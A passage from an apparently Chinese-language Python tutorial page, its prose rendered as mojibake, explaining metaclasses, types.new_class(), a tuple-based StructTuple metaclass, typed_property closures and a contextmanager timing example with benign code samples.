class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>å…ƒç±»çš„ä¸€ä¸ªå…³é”®ç‰¹ç‚¹æ˜¯å®ƒå…è®¸ä½ åœ¨å®šä¹‰çš„æ—¶å€™æ£€æŸ¥ç±»çš„å†…å®¹ã€‚åœ¨é‡æ–°å®šä¹‰<code>__init__()</code>æ–¹æ³•ä¸­ï¼Œä½ å¯ä»¥å¾ˆè½»æ¾çš„æ£€æŸ¥ç±»å­—å…¸ã€çˆ¶ç±»ç­‰ç­‰ã€‚å¹¶ä¸”ï¼Œä¸€æ—¦æŸä¸ªå…ƒç±»è¢«æŒ‡å®šç»™äº†æŸä¸ªç±»ï¼Œé‚£ä¹ˆå°±ä¼šè¢«ç»§æ‰¿åˆ°æ‰€æœ‰å­ç±»ä¸­å»ã€‚å› æ­¤ï¼Œä¸€ä¸ªæ¡†æ¶çš„æ„å»ºè€…å°±èƒ½åœ¨å¤§å‹çš„ç»§æ‰¿ä½“ç³»ä¸­é€šè¿‡ç»™ä¸€ä¸ªé¡¶çº§çˆ¶ç±»æŒ‡å®šä¸€ä¸ªå…ƒç±»å»æ•è·æ‰€æœ‰ä¸‹é¢å­ç±»çš„å®šä¹‰ã€‚</p><p>åœ¨å…ƒç±»ä¸­é€‰æ‹©é‡æ–°å®šä¹‰<code>__new__()</code>æ–¹æ³•è¿˜æ˜¯<code>__init__()</code>æ–¹æ³•å–å†³äºä½ æƒ³æ€æ ·ä½¿ç”¨ç»“æœç±»ã€‚<code>__new__()</code>æ–¹æ³•åœ¨ç±»åˆ›å»ºä¹‹å‰è¢«è°ƒç”¨ï¼Œé€šå¸¸ç”¨äºé€šè¿‡æŸç§æ–¹å¼ä¿®æ”¹ç±»çš„å®šä¹‰ã€‚ è€Œ<code>__init__()</code>æ–¹æ³•æ˜¯åœ¨ç±»è¢«åˆ›å»ºä¹‹åè¢«è°ƒç”¨ï¼Œå½“ä½ éœ€è¦å®Œæ•´æ„å»ºç±»å¯¹è±¡çš„æ—¶å€™ä¼šå¾ˆæœ‰ç”¨ã€‚ åœ¨æœ€åä¸€ä¸ªä¾‹å­ä¸­ï¼Œè¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº†<code>super()</code>å‡½æ•°æ¥æœç´¢ä¹‹å‰çš„å®šä¹‰ã€‚å®ƒåªèƒ½åœ¨ç±»çš„å®ä¾‹è¢«åˆ›å»ºä¹‹åï¼Œå¹¶ä¸”ç›¸åº”çš„æ–¹æ³•è§£æé¡ºåºä¹Ÿå·²ç»è¢«è®¾ç½®ã€‚</p><h4 id="ä»¥ç¼–ç¨‹æ–¹å¼å®šä¹‰ç±»"><a href="#ä»¥ç¼–ç¨‹æ–¹å¼å®šä¹‰ç±»" class="headerlink" title="ä»¥ç¼–ç¨‹æ–¹å¼å®šä¹‰ç±»"></a>ä»¥ç¼–ç¨‹æ–¹å¼å®šä¹‰ç±»</h4><p>å¯ä»¥ä½¿ç”¨å‡½æ•°<code>types.new_class()</code>æ¥åˆå§‹åŒ–æ–°çš„ç±»å¯¹è±¡ã€‚ ä½ éœ€è¦åšçš„åªæ˜¯æä¾›ç±»çš„åå­—ã€çˆ¶ç±»å…ƒç»„ã€å…³é”®å­—å‚æ•°ï¼Œä»¥åŠä¸€ä¸ªç”¨æˆå‘˜å˜é‡å¡«å……ç±»å­—å…¸çš„å›è°ƒå‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, shares, price)</span>:</span></span><br><span class="line">    self.name = name</span><br><span class="line">    self.shares = shares</span><br><span class="line">    self.price = price</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.shares * self.price</span><br><span class="line"></span><br><span class="line">cls_dict = &#123;</span><br><span class="line">    <span class="string">'__init__'</span> : __init__,</span><br><span class="line">    <span class="string">'cost'</span> : cost,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line">Stock = types.new_class(<span class="string">'Stock'</span>, (), &#123;&#125;, <span class="keyword">lambda</span> ns: ns.update(cls_dict))</span><br><span class="line">Stock.__module__ = __name__</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹å¼ä¼šæ„å»ºä¸€ä¸ªæ™®é€šçš„ç±»å¯¹è±¡ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&lt;stock.Stock object at <span class="number">0x1006a9b10</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.cost()</span><br><span class="line"><span class="number">4555.0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•ä¸­ï¼Œä¸€ä¸ªæ¯”è¾ƒéš¾ç†è§£çš„åœ°æ–¹æ˜¯åœ¨è°ƒç”¨å®Œ<code>types.new_class()</code>å¯¹<code>Stock.__module__</code>çš„èµ‹å€¼ã€‚æ¯æ¬¡å½“ä¸€ä¸ªç±»è¢«å®šä¹‰åï¼Œå®ƒçš„<code>__module__</code>å±æ€§åŒ…å«å®šä¹‰å®ƒçš„æ¨¡å—åã€‚è¿™ä¸ªåå­—ç”¨äºç”Ÿæˆ<code>__repr__()</code>æ–¹æ³•çš„è¾“å‡ºã€‚å®ƒåŒæ ·ä¹Ÿè¢«ç”¨äºå¾ˆå¤šåº“ï¼Œæ¯”å¦‚<code>pickle</code>ã€‚å› æ­¤ï¼Œä¸ºäº†è®©ä½ åˆ›å»ºçš„ç±»æ˜¯â€œæ­£ç¡®â€çš„ï¼Œä½ éœ€è¦ç¡®ä¿è¿™ä¸ªå±æ€§ä¹Ÿè®¾ç½®æ­£ç¡®äº†ã€‚</p><p>å¦‚æœä½ æƒ³åˆ›å»ºçš„ç±»éœ€è¦ä¸€ä¸ªä¸åŒçš„å…ƒç±»ï¼Œå¯ä»¥é€šè¿‡<code>types.new_class()</code>ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’ç»™å®ƒã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> abc</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Stock = types.new_class(<span class="string">'Stock'</span>, (), &#123;<span class="string">'metaclass'</span>: abc.ABCMeta&#125;,</span><br><span class="line"><span class="meta">... </span>                        <span class="keyword">lambda</span> ns: ns.update(cls_dict))</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Stock.__module__ = __name__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Stock</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">Stock</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span><span class="params">(Stock)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">abc</span>.<span class="title">ABCMeta</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ªå‚æ•°è¿˜å¯ä»¥åŒ…å«å…¶ä»–çš„å…³é”®å­—å‚æ•°ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªç±»çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(Base, debug=True, typecheck=False)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯ä»¥å°†å…¶ç¿»è¯‘æˆå¦‚ä¸‹çš„<code>new_class()</code>è°ƒç”¨å½¢å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Spam = types.new_class(<span class="string">'Spam'</span>, (Base,),</span><br><span class="line">                        &#123;<span class="string">'debug'</span>: <span class="literal">True</span>, <span class="string">'typecheck'</span>: <span class="literal">False</span>&#125;,</span><br><span class="line">                        <span class="keyword">lambda</span> ns: ns.update(cls_dict))</span><br></pre></td></tr></table></figure><p><code>new_class()</code>ç¬¬å››ä¸ªå‚æ•°æœ€ç¥ç§˜ï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨æ¥æ¥å—ç±»å‘½åç©ºé—´çš„æ˜ å°„å¯¹è±¡çš„å‡½æ•°ã€‚é€šå¸¸è¿™æ˜¯ä¸€ä¸ªæ™®é€šçš„å­—å…¸ï¼Œä½†æ˜¯å®ƒå®é™…ä¸Šæ˜¯<code>__prepare__()</code>æ–¹æ³•è¿”å›çš„ä»»æ„å¯¹è±¡ï¼Œè¿™ä¸ªå‡½æ•°éœ€è¦ä½¿ç”¨<code>update()</code>æ–¹æ³•ç»™å‘½åç©ºé—´å¢åŠ å†…å®¹ã€‚</p><h4 id="åœ¨å®šä¹‰çš„æ—¶å€™åˆå§‹åŒ–ç±»çš„æˆå‘˜"><a href="#åœ¨å®šä¹‰çš„æ—¶å€™åˆå§‹åŒ–ç±»çš„æˆå‘˜" class="headerlink" title="åœ¨å®šä¹‰çš„æ—¶å€™åˆå§‹åŒ–ç±»çš„æˆå‘˜"></a>åœ¨å®šä¹‰çš„æ—¶å€™åˆå§‹åŒ–ç±»çš„æˆå‘˜</h4><p>å¦‚æœæƒ³åœ¨ç±»è¢«å®šä¹‰çš„æ—¶å€™å°±åˆå§‹åŒ–ä¸€éƒ¨åˆ†ç±»çš„æˆå‘˜ï¼Œè€Œä¸æ˜¯è¦ç­‰åˆ°å®ä¾‹è¢«åˆ›å»ºåã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œåˆ©ç”¨è¿™ä¸ªæ€è·¯æ¥åˆ›å»ºç±»ä¼¼äº<code>collections</code>æ¨¡å—ä¸­çš„å‘½åå…ƒç»„çš„ç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StructTupleMeta</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(cls, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        <span class="keyword">for</span> n, name <span class="keyword">in</span> enumerate(cls._fields):</span><br><span class="line">            setattr(cls, name, property(operator.itemgetter(n)))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StructTuple</span><span class="params">(tuple, metaclass=StructTupleMeta)</span>:</span></span><br><span class="line">    _fields = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, *args)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(args) != len(cls._fields):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'&#123;&#125; arguments required'</span>.format(len(cls._fields)))</span><br><span class="line">        <span class="keyword">return</span> super().__new__(cls,args)</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å¯ä»¥ç”¨æ¥å®šä¹‰ç®€å•çš„åŸºäºå…ƒç»„çš„æ•°æ®ç»“æ„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(StructTuple)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(StructTuple)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'x'</span>, <span class="string">'y'</span>]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">0</span>]</span><br><span class="line"><span class="string">'ACME'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.name</span><br><span class="line"><span class="string">'ACME'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.shares * s.price</span><br><span class="line"><span class="number">4555.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.shares = <span class="number">23</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: can<span class="string">'t set attribute</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€å°èŠ‚ä¸­ï¼Œç±»<code>StructTupleMeta</code>è·å–åˆ°ç±»å±æ€§<code>_fields</code>ä¸­çš„å±æ€§åå­—åˆ—è¡¨ï¼Œç„¶åå°†å®ƒä»¬è½¬æ¢æˆç›¸åº”çš„å¯è®¿é—®ç‰¹å®šå…ƒç»„æ§½çš„æ–¹æ³•ã€‚å‡½æ•°<code>operator.itemgetter()</code>åˆ›å»ºä¸€ä¸ªè®¿é—®å™¨å‡½æ•°ï¼Œ ç„¶å<code>property()</code>å‡½æ•°å°†å…¶è½¬æ¢æˆä¸€ä¸ªå±æ€§ã€‚</p><p>æ¯”è¾ƒéš¾æ‡‚çš„éƒ¨åˆ†æ˜¯çŸ¥é“ä¸åŒçš„åˆå§‹åŒ–æ­¥éª¤æ˜¯ä»€ä¹ˆæ—¶å€™å‘ç”Ÿçš„ã€‚<code>StructTupleMeta</code>ä¸­çš„<code>__init__()</code>æ–¹æ³•åªåœ¨æ¯ä¸ªç±»è¢«å®šä¹‰æ—¶è¢«è°ƒç”¨ä¸€æ¬¡ã€‚<code>cls</code>å‚æ•°å°±æ˜¯é‚£ä¸ªè¢«å®šä¹‰çš„ç±»ã€‚å®é™…ä¸Šï¼Œä¸Šè¿°ä»£ç ä½¿ç”¨äº†<code>_fields</code>ç±»å˜é‡æ¥ä¿å­˜æ–°çš„è¢«å®šä¹‰çš„ç±»ï¼Œç„¶åç»™å®ƒå†æ·»åŠ ä¸€ç‚¹æ–°çš„ä¸œè¥¿ã€‚</p><p><code>StructTuple</code>ç±»ä½œä¸ºä¸€ä¸ªæ™®é€šçš„åŸºç±»ï¼Œä¾›å…¶ä»–ä½¿ç”¨è€…æ¥ç»§æ‰¿ã€‚è¿™ä¸ªç±»ä¸­çš„<code>__new__()</code>æ–¹æ³•ç”¨æ¥æ„é€ æ–°çš„å®ä¾‹ã€‚è¿™é‡Œä½¿ç”¨<code>__new__()</code>å¹¶ä¸æ˜¯å¾ˆå¸¸è§ï¼Œä¸»è¦æ˜¯å› ä¸ºæˆ‘ä»¬è¦ä¿®æ”¹å…ƒç»„çš„è°ƒç”¨ç­¾åï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åƒæ™®é€šçš„å®ä¾‹è°ƒç”¨é‚£æ ·åˆ›å»ºå®ä¾‹ã€‚å°±åƒä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>) <span class="comment"># OK</span></span><br><span class="line">s = Stock((<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)) <span class="comment"># Error</span></span><br></pre></td></tr></table></figure><p>è·Ÿ<code>__init__()</code>ä¸åŒçš„æ˜¯ï¼Œ<code>__new__()</code>æ–¹æ³•åœ¨å®ä¾‹è¢«åˆ›å»ºä¹‹å‰è¢«è§¦å‘ã€‚ç”±äºå…ƒç»„æ˜¯ä¸å¯ä¿®æ”¹çš„ï¼Œæ‰€ä»¥ä¸€æ—¦å®ƒä»¬è¢«åˆ›å»ºäº†å°±ä¸å¯èƒ½å¯¹å®ƒåšä»»ä½•æ”¹å˜ã€‚è€Œ<code>__init__()</code>ä¼šåœ¨å®ä¾‹åˆ›å»ºçš„æœ€åè¢«è§¦å‘ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ<code>__new__()</code>æ–¹æ³•å·²ç»è¢«å®šä¹‰äº†ã€‚</p><h4 id="é¿å…é‡å¤çš„å±æ€§æ–¹æ³•"><a href="#é¿å…é‡å¤çš„å±æ€§æ–¹æ³•" class="headerlink" title="é¿å…é‡å¤çš„å±æ€§æ–¹æ³•"></a>é¿å…é‡å¤çš„å±æ€§æ–¹æ³•</h4><p>è€ƒè™‘ä¸‹ä¸€ä¸ªç®€å•çš„ç±»ï¼Œå®ƒçš„å±æ€§ç”±å±æ€§æ–¹æ³•åŒ…è£…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name ,age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'name must be a string'</span>)</span><br><span class="line">        self._name = value</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @age.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'age must be an int'</span>)</span><br><span class="line">        self._age = value</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸ºäº†å®ç°å±æ€§å€¼çš„ç±»å‹æ£€æŸ¥æˆ‘ä»¬å†™äº†å¾ˆå¤šçš„é‡å¤ä»£ç ã€‚åªè¦ä½ ä»¥åçœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„ä»£ç ï¼Œä½ éƒ½åº”è¯¥æƒ³åŠæ³•å»ç®€åŒ–å®ƒã€‚ä¸€ä¸ªå¯è¡Œçš„æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªå‡½æ•°ç”¨æ¥å®šä¹‰å±æ€§å¹¶è¿”å›å®ƒã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">typed_property</span><span class="params">(name, expected_type)</span>:</span></span><br><span class="line">    storage_name = <span class="string">'_'</span> + name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self, storage_name)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @prop.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prop</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, expected_type):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'&#123;&#125; must be a &#123;&#125;'</span>.format(name, expected_type))</span><br><span class="line">        setattr(self, storage_name, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> prop</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = typed_property(<span class="string">'name'</span>, str)</span><br><span class="line">    age = typed_property(<span class="string">'age'</span>, int)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br></pre></td></tr></table></figure><p>æœ¬èŠ‚æˆ‘ä»¬æ¼”ç¤ºå†…éƒ¨å‡½æ•°æˆ–è€…é—­åŒ…çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼Œå®ƒä»¬å¾ˆåƒä¸€ä¸ªå®ã€‚ä¾‹å­ä¸­çš„å‡½æ•°<code>typed_property()</code>çœ‹ä¸Šå»æœ‰ç‚¹éš¾ç†è§£ï¼Œå…¶å®å®ƒæ‰€åšçš„ä»…ä»…å°±æ˜¯ä¸ºä½ ç”Ÿæˆå±æ€§å¹¶è¿”å›è¿™ä¸ªå±æ€§å¯¹è±¡ã€‚å› æ­¤ï¼Œå½“åœ¨ä¸€ä¸ªç±»ä¸­ä½¿ç”¨å®ƒçš„æ—¶å€™ï¼Œæ•ˆæœè·Ÿå°†å®ƒé‡Œé¢çš„ä»£ç æ”¾åˆ°ç±»å®šä¹‰ä¸­å»æ˜¯ä¸€æ ·çš„ã€‚å°½ç®¡å±æ€§çš„<code>getter</code>å’Œ<code>setter</code>æ–¹æ³•è®¿é—®äº†æœ¬åœ°å˜é‡å¦‚<code>name</code>,<code>expected_type</code>ä»¥åŠ<code>storate_name</code>ï¼Œè¿™äº›å˜é‡çš„å€¼ä¼šä¿å­˜åœ¨é—­åŒ…å½“ä¸­ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<code>functools.partial()</code>åƒä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line">String = partial(typed_property, expected_type=str)</span><br><span class="line">Integer = partial(typed_property, expected_type=int)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = String(<span class="string">'name'</span>)</span><br><span class="line">    age = Integer(<span class="string">'age'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br></pre></td></tr></table></figure><h4 id="å®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨"><a href="#å®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨" class="headerlink" title="å®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨"></a>å®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨</h4><p>å®ç°ä¸€ä¸ªæ–°çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨<code>contexlib</code>æ¨¡å—ä¸­çš„<code>@contextmanager</code>è£…é¥°å™¨ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå®ç°äº†ä»£ç å—è®¡æ—¶åŠŸèƒ½çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(label)</span>:</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">'&#123;&#125;: &#123;&#125;'</span>.format(label, end - start))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="keyword">with</span> timethis(<span class="string">'counting'</span>):</span><br><span class="line">    n = <span class="number">10000000</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°<code>timethis()</code>ä¸­ï¼Œ<code>yield</code>ä¹‹å‰çš„ä»£ç ä¼šåœ¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¸­ä½œä¸º<code>__enter__()</code>æ–¹æ³•æ‰§è¡Œï¼Œæ‰€æœ‰åœ¨<code>yield</code>ä¹‹åçš„ä»£ç ä¼šä½œä¸º<code>__exit__()</code>æ–¹æ³•æ‰§è¡Œã€‚ 